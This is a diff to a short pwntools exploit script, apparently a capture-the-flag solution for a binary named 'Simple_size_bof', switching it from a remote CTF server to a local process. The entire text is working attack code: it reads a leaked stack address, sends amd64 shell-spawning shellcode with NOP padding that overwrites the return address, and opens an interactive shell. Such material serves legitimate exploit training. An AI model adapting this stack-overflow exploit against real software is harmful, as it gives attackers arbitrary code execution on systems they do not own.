@@ -1,22 +1,23 @@
 from pwn import *
 
+p = process("./Simple_size_bof")
 #context.log_level = 'DEBUG'
 context.arch = 'amd64'
-e = ELF("./Simple_size_bof")
-#p = process("./Simple_size_bof")
-r = remote("ctf.j0n9hyun.xyz", 3005)
 
-shell = shellcraft.amd64.linux.sh()
-print r.recvuntil("buf: 0x"),
-buffer = r.recv(12)
+padding = 0x6d30 + 8
+shellcode = shellcraft.amd64.linux.sh()
+print "shellcode size :",len(asm(shellcode))
+
+print p.recvuntil("\n")
+print p.recvuntil("0x"),
+buffer = p.recv(12)
 print buffer
-offset = 0x6d30 + 8
-print "shellcode size : ",len(asm(shell))
+
 
 payload = ''
-payload += asm(shell)
-payload += "A"*(offset-len(asm(shell)))
+payload += asm(shellcode)
+payload += '\x90'*(padding - len(asm(shellcode)))
 payload += p64(int(buffer, 16))
 
-r.sendline(payload)
-r.interactive()
+p.sendline(payload)
+p.interactive()
